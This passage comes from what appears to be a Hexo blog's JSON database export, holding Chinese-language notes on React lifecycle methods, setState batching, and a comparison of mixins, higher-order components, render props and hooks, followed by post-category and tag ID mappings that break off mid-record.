中统一触发回调或更新状态。</li>\n</ul>\n</li>\n<li>卸载阶段<ul>\n<li><code>componentWillUnmount()</code>:  当我们的组件被卸载或者销毁了就会调用，我们可以在这个函数里去清除一些定时器，取消网络请求，清理无效的DOM元素等垃圾清理工作</li>\n</ul>\n</li>\n</ul>\n<p><code>componentDidUpdate</code> 钩子函数是在组件更新结束之后执行，在初始化 render 时不执行，如果在 componentDidMount 里面 setState 导致组件更新，组件更新后会执行 componentDidUpdate，此时在 componentDidUpdate 里面 setState 又会导致组件更新，造成成死循环了，如果要避免死循环，需要谨慎的在 componentDidUpdate 里面使用 setState，一般会在满足条件的情况下去使用 setState</p>\n<blockquote>\n<p>最常见的误解就是 <code>getDerivedStateFromProps</code> 和 <code>componentWillReceiveProps</code> 只会在 props “改变”时才会调用。实际上<strong>只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化”</strong></p>\n</blockquote>\n<h3 id=\"当外部的-props-改变时，如何再次执行请求数据？\"><a href=\"#当外部的-props-改变时，如何再次执行请求数据？\" class=\"headerlink\" title=\"当外部的 props 改变时，如何再次执行请求数据？\"></a>当外部的 props 改变时，如何再次执行请求数据？</h3><ul>\n<li>使用 <code>componentWillReceiveProps</code> （不推荐使用）</li>\n<li>使用 <code>getDerivedStateFromProps</code> + <code>componentDidUpdate</code></li>\n<li>使用 <code>key</code> 重新加载组件</li>\n</ul>\n<h3 id=\"当外部的-props-改变时，如何更改状态？\"><a href=\"#当外部的-props-改变时，如何更改状态？\" class=\"headerlink\" title=\"当外部的 props 改变时，如何更改状态？\"></a>当外部的 props 改变时，如何更改状态？</h3><ul>\n<li>使用 <code>getDerivedStateFromProps</code></li>\n<li>使用 <code>componentDidUpdate</code></li>\n<li>使用 <code>key</code> 重新加载组件</li>\n</ul>\n<h3 id=\"setState-是同步更新还是异步更新？\"><a href=\"#setState-是同步更新还是异步更新？\" class=\"headerlink\" title=\"setState 是同步更新还是异步更新？\"></a>setState 是同步更新还是异步更新？</h3><p>说明：调用 <code>setState()</code> 后，然后立即取 <code>state</code> 的值，<strong>可能</strong>并不能得到最新的值，看上去像是异步执行的。</p>\n<p>答案: 有时表现出<em>异步</em>，有时表现出<em>同步</em></p>\n<p>调用 setState –&gt; 放入延迟队列 –&gt; 比较 props、state 并更新 DOM</p>\n<blockquote>\n<p>setState 的批量更新优化也是建立在“异步”（合成事件、钩子函数）之上的</p>\n</blockquote>\n<p>在 React 的 <code>setState</code> 函数实现中，会根据一个变量 <code>isBatchingUpdates</code> 判断是直接更新 <code>this.state</code> 还是<strong>放到队列中延时更新</strong>，而 <code>isBatchingUpdates</code> 默认是 <code>false</code>，表示 <code>setState</code> 会同步更新 <code>this.state</code>；但是，有一个函数 <code>batchedUpdates</code>，该函数会把 <code>isBatchingUpdates</code> 修改为 <code>true</code>，而当 React 在调用事件处理函数(合成事件)之前就会先调用这个 <code>batchedUpdates</code> 将<code>isBatchingUpdates</code> 修改为 <code>true</code>，这样由 React 控制的事件处理过程 <code>setState</code> 不会同步更新 <code>this.state</code>。其他情况下，如原生事件和 <code>setTimeout</code> 中不会批量更新。</p>\n<p>所以，在 React 应用中，如果在合成事件和钩子函数中调用 <code>setState</code> 会表现成异步，如果在原生事件和 <code>setTimeout</code> 中调用 <code>setState</code> 会表现成同步。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React-生命周期\"><a href=\"#React-生命周期\" class=\"headerlink\" title=\"React 生命周期\"></a>React 生命周期</h1><p><strong>旧版本生命周期</strong><br><img src=\"evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p153\" alt=\"9913e024c3f2c4f65e3ef161b47ee06a.png\"></p>\n<blockquote>\n<p>React 17 会添加异步渲染的功能，即一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate，故不推荐使用</p>\n</blockquote>\n<p><strong>新版本生命周期</strong><br><img src=\"evernotecid://CE10AA85-EAB3-45B4-83E6-FF0E03D17746/appyinxiangcom/10250411/ENResource/p151\" alt=\"ead00979613189c0c49222aa0bec56c9.png\"></p>\n<ul>\n<li>挂载阶段<ul>\n<li><code>constructor(props)</code>: 构造函数会最先被执行，通常在构造函数里初始化 state 对象或者给自定义方法绑定 this</li>\n<li><code>static getDerivedStateFromProps(nextProps, prevState)</code>: 接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state ，或者返回 null 来表示接收到的 props 没有变化，不需要更新 state（配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法，在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用）</li>\n<li><code>render()</code>:  render 函数是纯函数，返回需要渲染的内容</li>\n<li><code>componentDidMount(prevProps, prevState, snapshot)</code>: 组件装载之后调用，此时我们可以获取到 DOM 节点并操作，比如对canvas，svg的操作，服务器请求，订阅都可以写在这个里面</li>\n</ul>\n</li>\n<li>更新阶段<ul>\n<li><code>static getDerivedStateFromProps(nextProps, prevState)</code>: 此方法在更新和挂载阶段都会被调用</li>\n<li><code>shouldComponentUpdate(nextProps, nextState)</code>: 通常利用此生命周期来优化React程序性能，返回一个布尔值，true 表示会触发重新渲染，false 表示不会触发重新渲染，默认返回 true, </li>\n<li><code>render()</code>: 更新阶段也会触发此生命周期</li>\n<li><code>getSnapshotBeforeUpdate(prevProps, prevState)</code>: 这个方法在 render 之后，componentDidUpdate 之前调用，有两个参数 prevProps 和 prevState，表示之前的 props 和之前的 state，这个函数有一个返回值，会作为第三个参数传给 componentDidUpdate，如果不想要返回值，可以返回null，此生命周期必须与 componentDidUpdate搭配使用</li>\n<li><code>componentDidUpdate(prevProps, prevState, snapshot)</code>: 该方法在 getSnapshotBeforeUpdate 方法之后被调用，有三个参数 prevProps，prevState，snapshot，表示之前的 props，之前的 state，和 snapshot。第三个参数是 getSnapshotBeforeUpdate 返回的，如果触发某些回调函数时需要用到 DOM 元素的状态，则将对比或计算的过程迁移至 getSnapshotBeforeUpdate，然后在 componentDidUpdate 中统一触发回调或更新状态。</li>\n</ul>\n</li>\n<li>卸载阶段<ul>\n<li><code>componentWillUnmount()</code>:  当我们的组件被卸载或者销毁了就会调用，我们可以在这个函数里去清除一些定时器，取消网络请求，清理无效的DOM元素等垃圾清理工作</li>\n</ul>\n</li>\n</ul>\n<p><code>componentDidUpdate</code> 钩子函数是在组件更新结束之后执行，在初始化 render 时不执行，如果在 componentDidMount 里面 setState 导致组件更新，组件更新后会执行 componentDidUpdate，此时在 componentDidUpdate 里面 setState 又会导致组件更新，造成成死循环了，如果要避免死循环，需要谨慎的在 componentDidUpdate 里面使用 setState，一般会在满足条件的情况下去使用 setState</p>\n<blockquote>\n<p>最常见的误解就是 <code>getDerivedStateFromProps</code> 和 <code>componentWillReceiveProps</code> 只会在 props “改变”时才会调用。实际上<strong>只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化”</strong></p>\n</blockquote>\n<h3 id=\"当外部的-props-改变时，如何再次执行请求数据？\"><a href=\"#当外部的-props-改变时，如何再次执行请求数据？\" class=\"headerlink\" title=\"当外部的 props 改变时，如何再次执行请求数据？\"></a>当外部的 props 改变时，如何再次执行请求数据？</h3><ul>\n<li>使用 <code>componentWillReceiveProps</code> （不推荐使用）</li>\n<li>使用 <code>getDerivedStateFromProps</code> + <code>componentDidUpdate</code></li>\n<li>使用 <code>key</code> 重新加载组件</li>\n</ul>\n<h3 id=\"当外部的-props-改变时，如何更改状态？\"><a href=\"#当外部的-props-改变时，如何更改状态？\" class=\"headerlink\" title=\"当外部的 props 改变时，如何更改状态？\"></a>当外部的 props 改变时，如何更改状态？</h3><ul>\n<li>使用 <code>getDerivedStateFromProps</code></li>\n<li>使用 <code>componentDidUpdate</code></li>\n<li>使用 <code>key</code> 重新加载组件</li>\n</ul>\n<h3 id=\"setState-是同步更新还是异步更新？\"><a href=\"#setState-是同步更新还是异步更新？\" class=\"headerlink\" title=\"setState 是同步更新还是异步更新？\"></a>setState 是同步更新还是异步更新？</h3><p>说明：调用 <code>setState()</code> 后，然后立即取 <code>state</code> 的值，<strong>可能</strong>并不能得到最新的值，看上去像是异步执行的。</p>\n<p>答案: 有时表现出<em>异步</em>，有时表现出<em>同步</em></p>\n<p>调用 setState –&gt; 放入延迟队列 –&gt; 比较 props、state 并更新 DOM</p>\n<blockquote>\n<p>setState 的批量更新优化也是建立在“异步”（合成事件、钩子函数）之上的</p>\n</blockquote>\n<p>在 React 的 <code>setState</code> 函数实现中，会根据一个变量 <code>isBatchingUpdates</code> 判断是直接更新 <code>this.state</code> 还是<strong>放到队列中延时更新</strong>，而 <code>isBatchingUpdates</code> 默认是 <code>false</code>，表示 <code>setState</code> 会同步更新 <code>this.state</code>；但是，有一个函数 <code>batchedUpdates</code>，该函数会把 <code>isBatchingUpdates</code> 修改为 <code>true</code>，而当 React 在调用事件处理函数(合成事件)之前就会先调用这个 <code>batchedUpdates</code> 将<code>isBatchingUpdates</code> 修改为 <code>true</code>，这样由 React 控制的事件处理过程 <code>setState</code> 不会同步更新 <code>this.state</code>。其他情况下，如原生事件和 <code>setTimeout</code> 中不会批量更新。</p>\n<p>所以，在 React 应用中，如果在合成事件和钩子函数中调用 <code>setState</code> 会表现成异步，如果在原生事件和 <code>setTimeout</code> 中调用 <code>setState</code> 会表现成同步。</p>\n"},{"title":"mixin、hoc、render props、hooks 的比较","date":"2021-05-26T08:32:38.000Z","_content":"\n# mixin、hoc、render props、hooks 的比较\n\n### mixin （已废弃）\n\n本质上就是将对象复制到另一个对象上，类似于 `Object.assign()`\n\n**缺点：**\n* 组件与 Mixin 之间存在隐式依赖\n* 不同 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题\n* mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题\n\n\n### hoc\n\n高阶组件（ higher-order component），类似于高阶组件接受一个组件作为参数，返回另一个组件\n\n> 高阶函数是函数式编程中一个基本的概念，它描述了一种这样的函数：接受函数作为输入，或是返回一个函数，比如 map, reduce等都是高阶函数。\n\n**缺点：**\n* 需要在原组件上进行包裹和嵌套，如果大量使用 HOC，将会产生非常多的嵌套，使调试变得非常困难\n* 固定的 props 可能会被覆盖.\n\n### render props\n\n说明：通过 props 接受一个返回 react element 的函数，来动态决定自己要渲染的结果\n\n**缺点：**\n* 嵌套过深\n* 写法较繁琐\n\n### hooks\n\n**缺点：**\n* 额外的学习成本\n* 在闭包场景可能会引用到旧的state、props值\n","source":"_posts/React/mixin、hoc、render props、hooks 的比较.md","raw":"---\ntitle: mixin、hoc、render props、hooks 的比较\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# mixin、hoc、render props、hooks 的比较\n\n### mixin （已废弃）\n\n本质上就是将对象复制到另一个对象上，类似于 `Object.assign()`\n\n**缺点：**\n* 组件与 Mixin 之间存在隐式依赖\n* 不同 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题\n* mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题\n\n\n### hoc\n\n高阶组件（ higher-order component），类似于高阶组件接受一个组件作为参数，返回另一个组件\n\n> 高阶函数是函数式编程中一个基本的概念，它描述了一种这样的函数：接受函数作为输入，或是返回一个函数，比如 map, reduce等都是高阶函数。\n\n**缺点：**\n* 需要在原组件上进行包裹和嵌套，如果大量使用 HOC，将会产生非常多的嵌套，使调试变得非常困难\n* 固定的 props 可能会被覆盖.\n\n### render props\n\n说明：通过 props 接受一个返回 react element 的函数，来动态决定自己要渲染的结果\n\n**缺点：**\n* 嵌套过深\n* 写法较繁琐\n\n### hooks\n\n**缺点：**\n* 额外的学习成本\n* 在闭包场景可能会引用到旧的state、props值\n","slug":"React/mixin、hoc、render props、hooks 的比较","published":1,"updated":"2021-06-07T11:45:29.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu2o000adf6r7zvt89je","content":"<h1 id=\"mixin、hoc、render-props、hooks-的比较\"><a href=\"#mixin、hoc、render-props、hooks-的比较\" class=\"headerlink\" title=\"mixin、hoc、render props、hooks 的比较\"></a>mixin、hoc、render props、hooks 的比较</h1><h3 id=\"mixin-（已废弃）\"><a href=\"#mixin-（已废弃）\" class=\"headerlink\" title=\"mixin （已废弃）\"></a>mixin （已废弃）</h3><p>本质上就是将对象复制到另一个对象上，类似于 <code>Object.assign()</code></p>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>组件与 Mixin 之间存在隐式依赖</li>\n<li>不同 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题</li>\n<li>mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题</li>\n</ul>\n<h3 id=\"hoc\"><a href=\"#hoc\" class=\"headerlink\" title=\"hoc\"></a>hoc</h3><p>高阶组件（ higher-order component），类似于高阶组件接受一个组件作为参数，返回另一个组件</p>\n<blockquote>\n<p>高阶函数是函数式编程中一个基本的概念，它描述了一种这样的函数：接受函数作为输入，或是返回一个函数，比如 map, reduce等都是高阶函数。</p>\n</blockquote>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>需要在原组件上进行包裹和嵌套，如果大量使用 HOC，将会产生非常多的嵌套，使调试变得非常困难</li>\n<li>固定的 props 可能会被覆盖.</li>\n</ul>\n<h3 id=\"render-props\"><a href=\"#render-props\" class=\"headerlink\" title=\"render props\"></a>render props</h3><p>说明：通过 props 接受一个返回 react element 的函数，来动态决定自己要渲染的结果</p>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>嵌套过深</li>\n<li>写法较繁琐</li>\n</ul>\n<h3 id=\"hooks\"><a href=\"#hooks\" class=\"headerlink\" title=\"hooks\"></a>hooks</h3><p><strong>缺点：</strong></p>\n<ul>\n<li>额外的学习成本</li>\n<li>在闭包场景可能会引用到旧的state、props值</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"mixin、hoc、render-props、hooks-的比较\"><a href=\"#mixin、hoc、render-props、hooks-的比较\" class=\"headerlink\" title=\"mixin、hoc、render props、hooks 的比较\"></a>mixin、hoc、render props、hooks 的比较</h1><h3 id=\"mixin-（已废弃）\"><a href=\"#mixin-（已废弃）\" class=\"headerlink\" title=\"mixin （已废弃）\"></a>mixin （已废弃）</h3><p>本质上就是将对象复制到另一个对象上，类似于 <code>Object.assign()</code></p>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>组件与 Mixin 之间存在隐式依赖</li>\n<li>不同 mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题</li>\n<li>mixins 之间可能会有先后顺序甚至代码冲突覆盖的问题</li>\n</ul>\n<h3 id=\"hoc\"><a href=\"#hoc\" class=\"headerlink\" title=\"hoc\"></a>hoc</h3><p>高阶组件（ higher-order component），类似于高阶组件接受一个组件作为参数，返回另一个组件</p>\n<blockquote>\n<p>高阶函数是函数式编程中一个基本的概念，它描述了一种这样的函数：接受函数作为输入，或是返回一个函数，比如 map, reduce等都是高阶函数。</p>\n</blockquote>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>需要在原组件上进行包裹和嵌套，如果大量使用 HOC，将会产生非常多的嵌套，使调试变得非常困难</li>\n<li>固定的 props 可能会被覆盖.</li>\n</ul>\n<h3 id=\"render-props\"><a href=\"#render-props\" class=\"headerlink\" title=\"render props\"></a>render props</h3><p>说明：通过 props 接受一个返回 react element 的函数，来动态决定自己要渲染的结果</p>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>嵌套过深</li>\n<li>写法较繁琐</li>\n</ul>\n<h3 id=\"hooks\"><a href=\"#hooks\" class=\"headerlink\" title=\"hooks\"></a>hooks</h3><p><strong>缺点：</strong></p>\n<ul>\n<li>额外的学习成本</li>\n<li>在闭包场景可能会引用到旧的state、props值</li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cknzv6w1m0001k96rg3qx2ppq","category_id":"cknzv6w1r0004k96rdmqy7j2w","_id":"cknzv6w1w000ck96rdtas9x92"},{"post_id":"cknzv6w1p0003k96r9yzq6wkz","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cknzv6w1x000fk96r16uf7wtv"},{"post_id":"cknzv6w1s0006k96rbptn0mat","category_id":"cknzv6w1w000dk96ran5f33h4","_id":"cknzv6w1y000kk96r8luz8prq"},{"post_id":"cknzv6w1t0007k96radz85m4b","category_id":"cknzv6w1x000gk96r8iesg836","_id":"cknzv6w1z000nk96rank5ev6z"},{"post_id":"cknzv6w1u0008k96r93999udz","category_id":"cknzv6w1x000gk96r8iesg836","_id":"cknzv6w20000qk96r79albuve"},{"post_id":"cknzz6sd50000is6retamarf5","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cknzz7fxm0003is6ra84iahy8"},{"post_id":"cknzzafoq0006is6r4yqgew4n","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cknzzb9qq0008is6rbb4t59gc"},{"post_id":"cko0u90va0000qd6r78a92gmp","category_id":"cknzv6w1r0004k96rdmqy7j2w","_id":"cko0u90vl0008qd6r8pzlbwqg"},{"post_id":"cko0u90va0000qd6r78a92gmp","category_id":"cko0u90vi0003qd6r8qcj50o4","_id":"cko0u90vl000aqd6rdr832fke"},{"post_id":"cko0u90vb0001qd6racbyegrg","category_id":"cknzv6w1r0004k96rdmqy7j2w","_id":"cko0u90vl000cqd6r19tw83il"},{"post_id":"cko0u90vb0001qd6racbyegrg","category_id":"cko0u90vi0003qd6r8qcj50o4","_id":"cko0u90vl000dqd6rfu7jaifp"},{"post_id":"cko0u126x0007y26rd2ureszb","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ubc1y0003rm6rc3sx0401"},{"post_id":"cko0u126r0005y26rgqlb1smt","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ubhr30005rm6r3gs7e48o"},{"post_id":"cko0u126o0002y26rhjen63xs","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ubmdc0007rm6rgiek816g"},{"post_id":"cko0u126z0009y26rczb7c1qt","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ubpb10009rm6r34zfd428"},{"post_id":"cko0u126v0006y26rh569bcq9","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ubsqd000brm6r2n1dcnjg"},{"post_id":"cko0u126e0000y26r9x4s5a3h","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0uce4v000drm6rhe4u3j54"},{"post_id":"cko0u126q0004y26rhwaw5mkh","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0uchpa000frm6r4d1lc9nc"},{"post_id":"cko0u126y0008y26r0x8pf7xw","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0uckfy000hrm6rg0tjadhf"},{"post_id":"cko0u126n0001y26r7fptggbm","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ucnfl000jrm6rcxf178ea"},{"post_id":"cko0u126p0003y26r9cg3h72g","category_id":"cko0ubc1t0000rm6rg5z24oip","_id":"cko0ucr86000lrm6rd0sdeifg"},{"post_id":"cko0u1270000ay26r1p80go36","category_id":"cko0uhcb7000qrm6r7f6b5zfw","_id":"cko0uhcb9000trm6r10xw0xxb"},{"post_id":"cko0u1271000by26rfpmyg2k5","category_id":"cko0uhcb7000qrm6r7f6b5zfw","_id":"cko0uhmrt000vrm6r8uqo058y"},{"post_id":"cko3yr62i0000io6r8bch6y68","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62p0006io6r4l7x04df"},{"post_id":"cko3yr62m0001io6r4th40mli","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62q0009io6r13la8arn"},{"post_id":"cko3yr62n0003io6r2zu5etvx","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62r000cio6r3czm58b0"},{"post_id":"cko3yr62o0005io6r8j3081p7","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62t000fio6rfeo82uod"},{"post_id":"cko3yr62q0008io6r5p20310q","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62u000iio6r7hek7jfw"},{"post_id":"cko3yr62r000bio6r5luz4fxa","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr62v000lio6r8f4n54jc"},{"post_id":"cko3yr62s000eio6rbx8h1bwl","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko3yr632000oio6r8v2seaxw"},{"post_id":"cko3yr631000nio6rhjz9a75o","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3ytls20001lh6rex8y5czw"},{"post_id":"cko3yr635000vio6r081sctkl","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3ytom80002lh6r69cmghfy"},{"post_id":"cko3yr636000yio6rgy80ad3l","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3ytrul0003lh6raa0deeyj"},{"post_id":"cko3yr62t000hio6rfm1ibuns","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3ytvde0004lh6r1ad46t6f"},{"post_id":"cko3yr632000pio6r46si22b3","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3yty280005lh6r1wo3fyci"},{"post_id":"cko3yr62v000kio6rhgje9i38","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3yu1v90006lh6r99cxato8"},{"post_id":"cko3yr633000rio6r3rdq7gii","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"cko3yu4hg0007lh6rcresb7i6"},{"post_id":"cko3z15pd0000mi6r39jn2gzm","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3z1xzz0003mi6r6b6l0yhm"},{"post_id":"cko3z7shv000dmi6rdduv1lmn","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3z7shw000fmi6rg664fqnv"},{"post_id":"cko3zbiwq000gmi6r3n3oag8j","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3zby3y000imi6rfn9s8bi0"},{"post_id":"cko3zh966000qmi6rep5te2cs","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3zhmmv000smi6rgtp407as"},{"post_id":"cko3zg3iw000nmi6r3tac9o2d","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3zhv0v000tmi6r6umpcyl2"},{"post_id":"cko3zifiq000vmi6rcjcb3gn0","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3ziris000xmi6r4kba2i7s"},{"post_id":"cko3zke2c00003l6r1ol503eg","category_id":"cko3z1xzy0001mi6r3nh26dd1","_id":"cko3zke2e00023l6r7i7w3eu5"},{"post_id":"cko3zocgn0009ox6r2yqv8szw","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko3zocgp000cox6r6gld7t49"},{"post_id":"cko4026bj000nox6r8i2ob0nk","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko4026bl000pox6r8oml24g3"},{"post_id":"cko402bgo000qox6r5lr42oet","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko402bgp000sox6rarbnd4vn"},{"post_id":"cko402yd1000tox6rf6we9ypt","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko402yd2000vox6re0w53usv"},{"post_id":"cko403s9o000wox6r9ng3d6og","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko4046l9000yox6r3ovx4dus"},{"post_id":"cko40q5ew0000ei6r2ifmg5g8","category_id":"cko3zo6rj0007ox6rb5xr5wzu","_id":"cko40r80j0002ei6r8wzcaet3"},{"post_id":"cko40wkn30000ql6ra7xmhlqr","category_id":"cknzv6w1v0009k96r0mfugf2t","_id":"cko40xpk40002ql6r0hj43ttf"},{"post_id":"cko8e8tcm0001qf6rdq4cc2sf","category_id":"cko8e8tco0003qf6rhr65gton","_id":"cko8e8td3000aqf6r18n60i4a"},{"post_id":"cko8e8tcn0002qf6r5scl0vq1","category_id":"cko8e8tco0003qf6rhr65gton","_id":"cko8e8td4000dqf6regcw5vus"},{"post_id":"cko8e8td00005qf6r7shxhlsf","category_id":"cko8e8tco0003qf6rhr65gton","_id":"cko8e8td5000fqf6r8f6a58sx"},{"post_id":"ckpccb4eq0003hq6rc8pt65f5","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpcce1ax0005l36reisl83av"},{"post_id":"ckpccb4ep0002hq6relq4gwt1","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpcce9m70007l36r2oau67py"},{"post_id":"ckpccb4es0005hq6rf9dw37aa","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpcceg2o0009l36r3rcva1wf"},{"post_id":"ckpccb4er0004hq6r8aab6mb7","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpccewux000bl36r4yut7afh"},{"post_id":"cko8e8tci0000qf6r1ftcgmew","category_id":"ckpccglty0002ki6rblz24ftk","_id":"ckpccgltz0005ki6r3ogr77g1"},{"post_id":"ckpccb4ek0000hq6rfxr36sqx","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"ckpcchcqh0007ki6r482vgf2w"},{"post_id":"ckpccb4el0001hq6r7z0t88rf","category_id":"cko3ytlrz0000lh6rc9r78dt5","_id":"ckpccho3p0009ki6r5wzf3xby"},{"post_id":"ckpmga1y20002ok6redi597i2","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yh0008ok6r54gwg3d0"},{"post_id":"ckpmga1y30004ok6rhbra89d4","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yi000aok6rey42f32i"},{"post_id":"ckpmga1yf0006ok6r5veq87ni","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yl000eok6r9pbb1qfl"},{"post_id":"ckpmga1yh0007ok6r8xv1gavl","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1ym000hok6rew24em33"},{"post_id":"ckpmga1yi0009ok6ras7a6re1","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yn000lok6r7xrhdh7a"},{"post_id":"ckpmga1yk000dok6r2c8jan2z","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yo000ook6rcctuf1q3"},{"post_id":"ckpmga1yl000gok6r0lcpe9gh","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yq000rok6r1pv15085"},{"post_id":"ckpmga1yn000kok6rhf654lvv","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yq000tok6r9ncj6v0k"},{"post_id":"ckpmga1yo000nok6r7h0ndud2","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yq000vok6r37cqbr80"},{"post_id":"ckpmga1yp000qok6r48qa8mkt","category_id":"ckpcce1aw0002l36r8ut84wl3","_id":"ckpmga1yr000xok6r9fer9dt3"},{"post_id":"ckpmjarfk0005xv6r4u9vai2x","category_id":"ckpmjarf70002xv6r50v9crzx","_id":"ckpmjarfo000bxv6r9776eum7"},{"post_id":"ckpmjarf00000xv6rdwpy8wm2","category_id":"ckpmjarf70002xv6r50v9crzx","_id":"ckpmjarfp000fxv6r8w5p7xyv"},{"post_id":"ckpmjarfl0006xv6r7yvdcro2","category_id":"ckpmjarf70002xv6r50v9crzx","_id":"ckpmjarfq000hxv6r7myefpgj"},{"post_id":"ckpmjarf50001xv6r2o9u9yib","category_id":"ckpmjarf70002xv6r50v9crzx","_id":"ckpmjarfq000jxv6r5l751esv"},{"post_id":"ckpmjarfj0004xv6r6w3dhxcx","category_id":"ckpmjarf70002xv6r50v9crzx","_id":"ckpmjarfq000kxv6rd5mqchi9"},{"post_id":"ckpmjm7k700015g6r3o7r7lyu","category_id":"ckpccglty0002ki6rblz24ftk","_id":"ckpmjm7ko00065g6rgjxm59j6"},{"post_id":"ckpmjm7km00055g6rcvcagqk9","category_id":"ckpmjm7k900025g6r508t6d12","_id":"ckpmjm7kp00095g6r3yvk9kk0"},{"post_id":"ckpmjm7k200005g6r683o8elo","category_id":"ckpmjm7k900025g6r508t6d12","_id":"ckpmjm7kp000a5g6rem7mc31b"},{"post_id":"ckpmjxu2l0005df6r21ymhd9b","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2q000cdf6rd8qf5z7l"},{"post_id":"ckpmjxu210000df6r5jiu6xiu","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2r000gdf6r6nntaxu1"},{"post_id":"ckpmjxu2m0006df6r8c5p76tj","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2r000idf6r3rgng78c"},{"post_id":"ckpmjxu2o000adf6r7zvt89je","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2r000kdf6rh1pmhsg4"},{"post_id":"ckpmjxu260001df6rfc457mt8","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2r000mdf6r2biiedbs"},{"post_id":"ckpmjxu2k0004df6rfkoc44x3","category_id":"ckpmjxu270002df6rgp4v94lg","_id":"ckpmjxu2s000ndf6r5blgfana"}],"PostTag":[{"post_id":"cknzv6w1m0001k96rg3qx2ppq","tag_id":"cknzv6w1s0005k96r3kof2eld","_id":"cknzv6w1w000bk96rbzz34gv0"},{"post_id":"cknzv6w1p0003k96r9yzq6wkz","tag_id":"cknzv6w1v000ak96r6i7cb5tq","_id":"cknzv6w1y000ik96r4hfq7kjj"},{"post_id":"cknzv6w1p0003k96r9yzq6wkz","tag_id":"cknzv6w1w000ek96rgsnnfqgd","_id":"cknzv6w1y000jk96r2mfv5wjq"},{"post_id":"cknzv6w1s0006k96rbptn0mat","tag_id":"cknzv6w1x000hk96rc1n69pst","_id":"cknzv